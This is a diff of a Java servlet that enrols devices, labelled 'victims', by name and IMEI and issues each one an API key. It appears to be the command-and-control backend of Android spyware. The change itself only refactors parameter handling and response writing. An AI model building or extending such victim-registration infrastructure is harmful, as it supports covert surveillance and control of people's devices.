@@ -25,7 +25,7 @@ import java.util.Random;
 @WebServlet(name = "IN Servlet", urlPatterns = {BaseServlet.VERSION_CODE + "/in"})
 public class INServlet extends BaseServlet {
 
-    private static final String[] requiredParams = {Victims.COLUMN_NAME, Clients.COLUMN_CLIENT_CODE, Victims.COLUMN_IMEI};
+    private static final String[] requiredParams = {Victims.COLUMN_NAME, Victims.COLUMN_IMEI};
     private static final int API_KEY_LENGTH = 10;
 
     protected void doPost(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws ServletException, IOException {
@@ -42,6 +42,8 @@ public class INServlet extends BaseServlet {
             final Victims victimsTable = Victims.getInstance();
             final Victim oldVictim = victimsTable.get(Victims.COLUMN_IMEI, imei);
 
+            final String apiKey;
+
             if (oldVictim == null) {
 
                 //Victim doesn't exists, so create new account
@@ -54,12 +56,11 @@ public class INServlet extends BaseServlet {
                 }
 
                 //Preparing new api key for new victim
-                final String apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
+                apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
 
-                final Victim newVictim = new Victim(name, imei, clientCode, apiKey, gcmId);
+                final Victim newVictim = new Victim(name, imei, apiKey, gcmId);
 
                 victimsTable.addv2(newVictim);
-                out.write(JSONUtils.getSuccessJSON(Victims.COLUMN_API_KEY, apiKey));
 
             } else {
 
@@ -71,8 +72,12 @@ public class INServlet extends BaseServlet {
                 }
 
                 //Old victim!
-                out.write(JSONUtils.getSuccessJSON(Victims.COLUMN_API_KEY, oldVictim.getApiKey()));
+                apiKey = oldVictim.getApiKey();
             }
+
+
+            //Finally
+            out.write(JSONUtils.getSuccessJSON(Victims.COLUMN_API_KEY, apiKey));
 
         } catch (Exception e) {
             out.write(JSONUtils.getErrorJSON(e.getMessage()));
